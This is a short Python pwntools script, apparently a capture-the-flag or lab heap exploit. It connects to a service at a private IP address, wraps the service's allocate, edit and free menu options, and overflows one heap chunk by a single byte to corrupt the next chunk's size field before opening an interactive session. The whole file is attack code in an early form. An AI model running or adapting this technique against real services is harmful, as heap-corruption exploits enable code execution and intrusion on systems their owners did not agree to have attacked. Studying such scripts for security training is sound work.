from pwn import *

s = remote('192.168.33.10',1234)

def alloc(size, dat):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil(':')
  s.sendline(str(size))
  s.recvuntil(':')
  s.send(dat)

def edit(index, dat):
  s.recvuntil('>')
  s.sendline('2')
  s.recvuntil(':')
  s.sendline(str(index))
  s.recvuntil(':')
  s.send(dat)

def free(index):
  s.recvuntil('>')
  s.sendline('3')
  s.recvuntil(':')
  s.sendline(str(index))

alloc(0x80,"\x40"*0x80)
alloc(0x80,"\x40"*0x80)
edit(0,"A"*0x80+p8(0x60))
s.interactive()
